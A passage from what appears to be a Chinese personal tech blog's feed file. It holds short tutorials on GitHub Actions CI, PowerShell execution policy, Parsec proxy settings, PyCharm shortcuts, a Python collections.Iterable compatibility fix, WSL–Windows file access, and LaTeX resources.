自动化任务"></a><strong>1. 使用 GitHub Actions 自动化任务</strong></h4><p>你可以在 GitHub 上配置 <strong>GitHub Actions</strong>，实现以下功能：</p><ul><li>自动运行测试代码。</li><li>部署代码到服务器。</li></ul><p>示例 <code>.github/workflows/main.yml</code> 文件：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">name</span><span class="token punctuation">:</span> CI/CD Pipeline<span class="token key atrule">on</span><span class="token punctuation">:</span>  <span class="token key atrule">push</span><span class="token punctuation">:</span>    <span class="token key atrule">branches</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> main<span class="token key atrule">jobs</span><span class="token punctuation">:</span>  <span class="token key atrule">build</span><span class="token punctuation">:</span>    <span class="token key atrule">runs-on</span><span class="token punctuation">:</span> ubuntu<span class="token punctuation">-</span>latest    <span class="token key atrule">steps</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Checkout code        <span class="token key atrule">uses</span><span class="token punctuation">:</span> actions/checkout@v3      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Setup Python        <span class="token key atrule">uses</span><span class="token punctuation">:</span> actions/setup<span class="token punctuation">-</span>python@v4        <span class="token key atrule">with</span><span class="token punctuation">:</span>          <span class="token key atrule">python-version</span><span class="token punctuation">:</span> <span class="token string">'3.8'</span>      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Install dependencies        <span class="token key atrule">run</span><span class="token punctuation">:</span> pip install <span class="token punctuation">-</span>r requirements.txt      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Run tests        <span class="token key atrule">run</span><span class="token punctuation">:</span> pytest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-使用-PyCharm-的任务管理"><a href="#2-使用-PyCharm-的任务管理" class="headerlink" title="2. 使用 PyCharm 的任务管理"></a><strong>2. 使用 PyCharm 的任务管理</strong></h4><ul><li>在 PyCharm 中配置 <strong>Tasks &amp; Contexts</strong>，跟踪开发任务和环境状态。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更改 Windows PowerShell 的执行策略</title>
      <link href="/2024/12/21/geng-gai-windows-powershell-de-zhi-xing-ce-lue/"/>
      <url>/2024/12/21/geng-gai-windows-powershell-de-zhi-xing-ce-lue/</url>
      
        <content type="html"><![CDATA[<h1 id="更改-Windows-PowerShell-的执行策略"><a href="#更改-Windows-PowerShell-的执行策略" class="headerlink" title="更改 Windows PowerShell 的执行策略"></a>更改 Windows PowerShell 的执行策略</h1><h3 id="1-打开-PowerShell-以管理员身份运行"><a href="#1-打开-PowerShell-以管理员身份运行" class="headerlink" title="1. 打开 PowerShell 以管理员身份运行"></a>1. 打开 PowerShell 以管理员身份运行</h3><p>首先，您需要以管理员身份运行 PowerShell：</p><ul><li>按 <code>Win + X</code> 并选择“Windows PowerShell (管理员)”。</li><li>如果您使用的是较新的 Windows 版本，也可以搜索“PowerShell”，右键点击并选择“以管理员身份运行”。</li></ul><h3 id="2-检查当前执行策略"><a href="#2-检查当前执行策略" class="headerlink" title="2. 检查当前执行策略"></a>2. 检查当前执行策略</h3><p>在更改执行策略之前，您可以查看当前的执行策略设置，执行以下命令：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Get-ExecutionPolicy</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该命令将返回当前的执行策略，可能的输出包括：</p><ul><li><code>Restricted</code>（默认策略，不允许执行任何脚本）</li><li><code>RemoteSigned</code>（本地脚本可以运行，下载的脚本需要签名）</li><li><code>Unrestricted</code>（允许所有脚本运行）</li><li><code>ByPass</code>（完全忽略执行策略）</li></ul><h3 id="3-修改执行策略"><a href="#3-修改执行策略" class="headerlink" title="3. 修改执行策略"></a>3. 修改执行策略</h3><p>要更改执行策略，可以使用 <code>Set-ExecutionPolicy</code> 命令。例如，您可以将执行策略更改为 <code>RemoteSigned</code>，这样可以运行本地脚本并允许下载的签名脚本运行：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-ExecutionPolicy</span> RemoteSigned<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果您希望设置为不限制脚本执行，可以使用 <code>Unrestricted</code>：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-ExecutionPolicy</span> Unrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者，如果您希望脚本完全不受限制（但存在安全风险），可以使用 <code>Bypass</code>：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-ExecutionPolicy</span> Bypass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-确认更改"><a href="#4-确认更改" class="headerlink" title="4. 确认更改"></a>4. 确认更改</h3><p>更改执行策略后，系统会要求您确认。输入 <code>Y</code> 进行确认并按回车。</p><h3 id="5-检查执行策略更改是否生效"><a href="#5-检查执行策略更改是否生效" class="headerlink" title="5. 检查执行策略更改是否生效"></a>5. 检查执行策略更改是否生效</h3><p>再次执行以下命令来确保策略已更新：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Get-ExecutionPolicy</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-了解不同的执行策略"><a href="#6-了解不同的执行策略" class="headerlink" title="6. 了解不同的执行策略"></a>6. 了解不同的执行策略</h3><ul><li><code>Restricted</code>：不允许运行任何脚本（这是默认设置）。</li><li><code>RemoteSigned</code>：允许本地脚本运行，但从互联网下载的脚本需要有效的签名才能运行。</li><li><code>Unrestricted</code>：允许所有脚本运行，但会在运行下载的脚本时给出警告。</li><li><code>Bypass</code>：完全忽略执行策略（适用于临时需求，但有安全隐患）。</li><li><code>AllSigned</code>：要求所有脚本必须由可信的发布者签名，适用于更严格的安全要求。</li></ul><h3 id="7-恢复默认执行策略"><a href="#7-恢复默认执行策略" class="headerlink" title="7. 恢复默认执行策略"></a>7. 恢复默认执行策略</h3><p>如果您希望恢复默认的执行策略，只需执行：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-ExecutionPolicy</span> Restricted<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>parsec教程</title>
      <link href="/2024/12/13/parsec-jiao-cheng/"/>
      <url>/2024/12/13/parsec-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="parsec教程"><a href="#parsec教程" class="headerlink" title="parsec教程"></a>parsec教程</h1><h2 id="修改代理"><a href="#修改代理" class="headerlink" title="修改代理"></a>修改代理</h2><p>找到文件<code>C:\Users\用户名\AppData\Roaming\Parsec\config.josn</code>，修改</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"app_proxy"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span><span class="token string">"value"</span><span class="token builtin class-name">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span>,<span class="token string">"app_proxy_address"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span><span class="token string">"value"</span><span class="token builtin class-name">:</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">}</span>,<span class="token string">"app_proxy_port"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span><span class="token string">"value"</span><span class="token builtin class-name">:</span> <span class="token number">10808</span><span class="token punctuation">}</span>,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参照你的代理端口修改</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pycharm快捷键</title>
      <link href="/2024/12/11/pycharm-kuai-jie-jian/"/>
      <url>/2024/12/11/pycharm-kuai-jie-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="pycharm快捷键"><a href="#pycharm快捷键" class="headerlink" title="pycharm快捷键"></a>pycharm快捷键</h1><p>pycharm快捷键</p><p>以下是 PyCharm 在 Windows 上高效开发常用的快捷键列表，按照功能分类：</p><hr><h3 id="文件与项目管理"><a href="#文件与项目管理" class="headerlink" title="文件与项目管理"></a><strong>文件与项目管理</strong></h3><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>打开文件/最近文件</td><td><code>Ctrl + E</code></td></tr><tr><td>查找文件</td><td><code>Ctrl + Shift + N</code></td></tr><tr><td>切换到项目视图</td><td><code>Alt + 1</code></td></tr><tr><td>显示/隐藏工具窗口</td><td><code>Alt + #[1-9]</code></td></tr></tbody></table><hr><h3 id="代码导航"><a href="#代码导航" class="headerlink" title="代码导航"></a><strong>代码导航</strong></h3><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>跳转到声明/定义</td><td><code>Ctrl + B</code> 或 <code>Ctrl + 鼠标左键</code></td></tr><tr><td>返回到上一个位置</td><td><code>Ctrl + Alt + 左箭头</code></td></tr><tr><td>前进到下一个位置</td><td><code>Ctrl + Alt + 右箭头</code></td></tr><tr><td>快速导航到符号（类、方法等）</td><td><code>Ctrl + Shift + Alt + N</code></td></tr><tr><td>显示方法列表</td><td><code>Ctrl + F12</code></td></tr></tbody></table><hr><h3 id="代码编辑"><a href="#代码编辑" class="headerlink" title="代码编辑"></a><strong>代码编辑</strong></h3><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>格式化代码</td><td><code>Ctrl + Alt + L</code></td></tr><tr><td>智能补全（代码补全）</td><td><code>Ctrl + 空格</code></td></tr><tr><td>自动导入</td><td><code>Alt + Enter</code></td></tr><tr><td>多光标选择</td><td><code>Alt + 鼠标左键</code> 或 <code>Ctrl + Alt + Shift + J</code></td></tr><tr><td>快速重构（重命名、提取变量等）</td><td><code>Shift + F6</code></td></tr><tr><td>注释/取消注释行代码</td><td><code>Ctrl + /</code></td></tr><tr><td>注释/取消注释块代码</td><td><code>Ctrl + Shift + /</code></td></tr></tbody></table><hr><h3 id="运行与调试"><a href="#运行与调试" class="headerlink" title="运行与调试"></a><strong>运行与调试</strong></h3><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>运行当前文件</td><td><code>Shift + F10</code></td></tr><tr><td>调试当前文件</td><td><code>Shift + F9</code></td></tr><tr><td>添加断点</td><td><code>Ctrl + F8</code></td></tr><tr><td>步入（Step Into）</td><td><code>F7</code></td></tr><tr><td>步过（Step Over）</td><td><code>F8</code></td></tr><tr><td>跳出（Step Out）</td><td><code>Shift + F8</code></td></tr></tbody></table><hr><h3 id="搜索与替换"><a href="#搜索与替换" class="headerlink" title="搜索与替换"></a><strong>搜索与替换</strong></h3><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>全局搜索</td><td><code>Ctrl + Shift + F</code></td></tr><tr><td>替换</td><td><code>Ctrl + R</code></td></tr><tr><td>在文件中搜索</td><td><code>Ctrl + F</code></td></tr><tr><td>查找下一个</td><td><code>F3</code></td></tr><tr><td>查找上一个</td><td><code>Shift + F3</code></td></tr></tbody></table><hr><h3 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a><strong>版本控制</strong></h3><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>查看版本历史（当前文件）</td><td><code>Ctrl + Shift + A</code> 然后输入 <code>File History</code></td></tr><tr><td>提交变更</td><td><code>Ctrl + K</code></td></tr><tr><td>更新项目</td><td><code>Ctrl + T</code></td></tr><tr><td>显示版本控制窗口</td><td><code>Alt + 9</code></td></tr></tbody></table><hr><h3 id="通用快捷键"><a href="#通用快捷键" class="headerlink" title="通用快捷键"></a><strong>通用快捷键</strong></h3><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>搜索动作（如功能、设置等）</td><td><code>Ctrl + Shift + A</code></td></tr><tr><td>打开设置</td><td><code>Ctrl + Alt + S</code></td></tr><tr><td>切换全屏模式</td><td><code>Ctrl + Shift + F11</code></td></tr><tr><td>显示代码提示信息</td><td><code>Ctrl + Q</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python库merklelib</title>
      <link href="/2024/12/06/python-ku-merklelib/"/>
      <url>/2024/12/06/python-ku-merklelib/</url>
      
        <content type="html"><![CDATA[<h1 id="python库merklelib"><a href="#python库merklelib" class="headerlink" title="python库merklelib"></a>python库merklelib</h1><h2 id="报错AttributeError-module-‘collections’-has-no-attribute-‘Iterable’"><a href="#报错AttributeError-module-‘collections’-has-no-attribute-‘Iterable’" class="headerlink" title="报错AttributeError: module ‘collections’ has no attribute ‘Iterable’"></a>报错AttributeError: module ‘collections’ has no attribute ‘Iterable’</h2><p>该错误发生在 Python 3.10 或更高版本中，因为 <code>collections.Iterable</code> 在 Python 3.10 中已被移至 <code>collections.abc.Iterable</code>。这是 Python 的一个兼容性问题。</p><p>要解决此问题，请将代码中的 <code>collections.Iterable</code> 替换为 <code>collections.abc.Iterable</code>：</p><h3 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> collections<span class="token punctuation">.</span>abc<span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> collections<span class="token punctuation">.</span>abc<span class="token punctuation">.</span>Iterable<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Your logic here</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果你正在使用一个依赖于旧版 <code>collections.Iterable</code> 的库（如 <code>merklelib</code>），可以通过以下方式解决：</p><h3 id="解决方法-1：升级相关库"><a href="#解决方法-1：升级相关库" class="headerlink" title="解决方法 1：升级相关库"></a>解决方法 1：升级相关库</h3><p>检查是否有更新的版本来支持 Python 3.10+。你可以尝试更新库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> merklelib<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="解决方法-2：兼容性修复"><a href="#解决方法-2：兼容性修复" class="headerlink" title="解决方法 2：兼容性修复"></a>解决方法 2：兼容性修复</h3><p>如果库尚未更新，你可以手动修复代码：</p><ol><li>打开出错的代码文件（通常在库的安装目录中）。</li><li>找到 <code>collections.Iterable</code> 并替换为 <code>collections.abc.Iterable</code>。</li></ol><p>或者，临时修复可以通过 Monkey Patch：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> collections<span class="token punctuation">.</span>abccollections<span class="token punctuation">.</span>Iterable <span class="token operator">=</span> collections<span class="token punctuation">.</span>abc<span class="token punctuation">.</span>Iterable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="解决方法-3：降级-Python-版本"><a href="#解决方法-3：降级-Python-版本" class="headerlink" title="解决方法 3：降级 Python 版本"></a>解决方法 3：降级 Python 版本</h3><p>如果无法更新库或代码，可以暂时降级到 Python 3.9：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pyenv <span class="token function">install</span> <span class="token number">3.9</span>.12pyenv global <span class="token number">3.9</span>.12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>推荐优先升级库或修复代码以适应 Python 的新版本</p>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSL 与 Windows 互相访问教程</title>
      <link href="/2024/12/01/wsl-he-windows-hu-xiang-fang-wen/"/>
      <url>/2024/12/01/wsl-he-windows-hu-xiang-fang-wen/</url>
      
        <content type="html"><![CDATA[<h1 id="WSL-与-Windows-互相访问教程"><a href="#WSL-与-Windows-互相访问教程" class="headerlink" title="WSL 与 Windows 互相访问教程"></a><strong>WSL 与 Windows 互相访问教程</strong></h1><p>以下教程将介绍如何在 WSL 和 Windows 系统之间互相访问文件并实现无缝交互。</p><hr><h2 id="一、Windows-访问-WSL-文件"><a href="#一、Windows-访问-WSL-文件" class="headerlink" title="一、Windows 访问 WSL 文件"></a><strong>一、Windows 访问 WSL 文件</strong></h2><h3 id="方法-1：通过网络路径访问"><a href="#方法-1：通过网络路径访问" class="headerlink" title="方法 1：通过网络路径访问"></a><strong>方法 1：通过网络路径访问</strong></h3><p>WSL 文件系统挂载在 Windows 网络路径 <code>\\wsl$</code> 下，可以直接访问。</p><ol><li><p><strong>打开文件资源管理器或命令行：</strong> 在地址栏或命令行输入以下路径：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span><span class="token punctuation">\</span>wsl$<span class="token punctuation">\</span><span class="token operator">&lt;</span>发行版名称<span class="token operator">&gt;</span><span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span><span class="token punctuation">\</span>wsl$<span class="token punctuation">\</span>Ubuntu<span class="token punctuation">\</span>home<span class="token punctuation">\</span><span class="token operator">&lt;</span>用户名<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>直接访问 WSL 文件：</strong></p><ul><li><p>文件资源管理器中可以像操作普通文件夹一样管理文件。</p></li><li><p>在命令行中可以使用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>wsl$<span class="token punctuation">\</span>Ubuntu<span class="token punctuation">\</span>home<span class="token punctuation">\</span><span class="token operator">&lt;</span>用户名<span class="token operator">&gt;</span><span class="token function">dir</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>优点：</strong></p><ul><li>直接访问，无需额外配置。</li><li>文件路径自动挂载，无权限问题。</li></ul></li></ol><hr><h3 id="方法-2：通过挂载路径访问"><a href="#方法-2：通过挂载路径访问" class="headerlink" title="方法 2：通过挂载路径访问"></a><strong>方法 2：通过挂载路径访问</strong></h3><p>WSL 的文件系统实际上存储在 Windows 用户目录下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token operator">&lt;</span>用户名<span class="token operator">&gt;</span><span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Packages<span class="token punctuation">\</span><span class="token operator">&lt;</span>WSL发行版ID<span class="token operator">&gt;</span><span class="token punctuation">\</span>LocalState<span class="token punctuation">\</span>rootfs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="操作步骤："><a href="#操作步骤：" class="headerlink" title="操作步骤："></a><strong>操作步骤：</strong></h4><ol><li><p><strong>定位路径：</strong> 打开资源管理器，导航到上述路径。</p></li><li><p><strong>通过命令行访问：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token string">"C:\Users\&lt;用户名&gt;\AppData\Local\Packages\&lt;发行版ID&gt;\LocalState<span class="token entity" title="\r">\r</span>ootfs"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>注意：</strong></p><ul><li><strong>不要直接修改</strong> <code>LocalState</code> 下的文件，可能导致 WSL 文件系统损坏。</li><li>尽量使用 <code>\\wsl$</code> 路径，安全可靠。</li></ul><hr><h3 id="方法-3：通过-WSL-挂载目录"><a href="#方法-3：通过-WSL-挂载目录" class="headerlink" title="方法 3：通过 WSL 挂载目录"></a><strong>方法 3：通过 WSL 挂载目录</strong></h3><p>WSL 可以直接挂载 Windows 文件系统，访问路径为 <code>/mnt/&lt;盘符&gt;</code>。</p><ol><li><p>在 WSL 中访问：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /mnt/c/Users/<span class="token operator">&lt;</span>用户名<span class="token operator">&gt;</span>/Documents<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>常见操作：</p><ul><li><p>列出文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> /mnt/c/Users/<span class="token operator">&lt;</span>用户名<span class="token operator">&gt;</span>/Documents<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>复制文件到 WSL：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /mnt/c/Users/<span class="token operator">&lt;</span>用户名<span class="token operator">&gt;</span>/Documents/文件.txt ~/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ol><hr><h2 id="二、WSL-访问-Windows-文件"><a href="#二、WSL-访问-Windows-文件" class="headerlink" title="二、WSL 访问 Windows 文件"></a><strong>二、WSL 访问 Windows 文件</strong></h2><h3 id="默认挂载的文件路径"><a href="#默认挂载的文件路径" class="headerlink" title="默认挂载的文件路径"></a><strong>默认挂载的文件路径</strong></h3><p>WSL 会自动挂载 Windows 的文件系统，所有分区挂载在 <code>/mnt/&lt;盘符&gt;</code> 下。例如：</p><ul><li><code>C:\</code> 对应 <code>/mnt/c</code></li><li><code>D:\</code> 对应 <code>/mnt/d</code></li></ul><ol><li><p><strong>列出 Windows 文件：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> /mnt/c/Users/<span class="token operator">&lt;</span>用户名<span class="token operator">&gt;</span>/Documents<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>复制文件到 WSL：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /mnt/c/Users/<span class="token operator">&lt;</span>用户名<span class="token operator">&gt;</span>/Documents/文件.txt ~/wsl目录/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>移动文件到 Windows：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> ~/wsl目录/文件.txt /mnt/c/Users/<span class="token operator">&lt;</span>用户名<span class="token operator">&gt;</span>/Desktop/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><hr><h2 id="三、实现-WSL-和-Windows-共享目录"><a href="#三、实现-WSL-和-Windows-共享目录" class="headerlink" title="三、实现 WSL 和 Windows 共享目录"></a><strong>三、实现 WSL 和 Windows 共享目录</strong></h2><h3 id="方法-1：在-WSL-中创建软链接"><a href="#方法-1：在-WSL-中创建软链接" class="headerlink" title="方法 1：在 WSL 中创建软链接"></a><strong>方法 1：在 WSL 中创建软链接</strong></h3><p>如果频繁需要访问某些 Windows 目录，可以通过软链接简化路径。</p><ol><li><p><strong>创建链接：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /mnt/c/Users/<span class="token operator">&lt;</span>用户名<span class="token operator">&gt;</span>/Documents ~/windows-documents<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>访问链接：</strong> 直接进入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/windows-documents<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="方法-2：共享-WSL-的目录给-Windows"><a href="#方法-2：共享-WSL-的目录给-Windows" class="headerlink" title="方法 2：共享 WSL 的目录给 Windows"></a><strong>方法 2：共享 WSL 的目录给 Windows</strong></h3><p>可以通过设置 WSL 中的目录，让 Windows 使用 <code>\\wsl$</code> 访问。</p><ol><li><p><strong>在 WSL 中创建目录：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> ~/shared-folder<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>在 Windows 中访问：</strong> 打开资源管理器，导航到：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span><span class="token punctuation">\</span>wsl$<span class="token punctuation">\</span>Ubuntu<span class="token punctuation">\</span>home<span class="token punctuation">\</span><span class="token operator">&lt;</span>用户名<span class="token operator">&gt;</span><span class="token punctuation">\</span>shared-folder<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><hr><h2 id="四、在-WSL-和-Windows-间传输文件"><a href="#四、在-WSL-和-Windows-间传输文件" class="headerlink" title="四、在 WSL 和 Windows 间传输文件"></a><strong>四、在 WSL 和 Windows 间传输文件</strong></h2><h3 id="方法-1：直接复制文件"><a href="#方法-1：直接复制文件" class="headerlink" title="方法 1：直接复制文件"></a><strong>方法 1：直接复制文件</strong></h3><p>可以使用 <code>cp</code> 或 <code>mv</code> 命令实现文件复制或移动。</p><h4 id="从-WSL-复制文件到-Windows："><a href="#从-WSL-复制文件到-Windows：" class="headerlink" title="从 WSL 复制文件到 Windows："></a><strong>从 WSL 复制文件到 Windows：</strong></h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> ~/文件.txt /mnt/c/Users/<span class="token operator">&lt;</span>用户名<span class="token operator">&gt;</span>/Desktop/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="从-Windows-复制文件到-WSL："><a href="#从-Windows-复制文件到-WSL：" class="headerlink" title="从 Windows 复制文件到 WSL："></a><strong>从 Windows 复制文件到 WSL：</strong></h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /mnt/c/Users/<span class="token operator">&lt;</span>用户名<span class="token operator">&gt;</span>/Desktop/文件.txt ~/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="方法-2：使用-explorer-exe-打开-WSL-文件夹"><a href="#方法-2：使用-explorer-exe-打开-WSL-文件夹" class="headerlink" title="方法 2：使用 explorer.exe 打开 WSL 文件夹"></a><strong>方法 2：使用 <code>explorer.exe</code> 打开 WSL 文件夹</strong></h3><p>在 WSL 中可以直接使用 Windows 的资源管理器访问当前目录：</p><ol><li><p>在 WSL 终端中输入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">explorer.exe <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>Windows 文件资源管理器会打开 WSL 当前路径。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>latex教程</title>
      <link href="/2024/11/28/latex-jiao-cheng/"/>
      <url>/2024/11/28/latex-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="latex教程"><a href="#latex教程" class="headerlink" title="latex教程"></a>latex教程</h1><p>latex教程</p><p>参考网站：</p><p><a href="https://zilutian.github.io/latex-tutorial-chinese/">LaTeX 教程</a></p><p><a href="https://www.latexstudio.net/LearnLaTeX/basic/01.html">LaTeX 基础 | LaTeX 知识库</a></p><p><a href="https://www.latexlive.com/">在线LaTeX公式编辑器-编辑器</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学中的困难问题详解</title>
      <link href="/2024/11/28/mi-ma-xue-kun-nan-wen-ti/"/>
      <url>/2024/11/28/mi-ma-xue-kun-nan-wen-ti/</url>
      
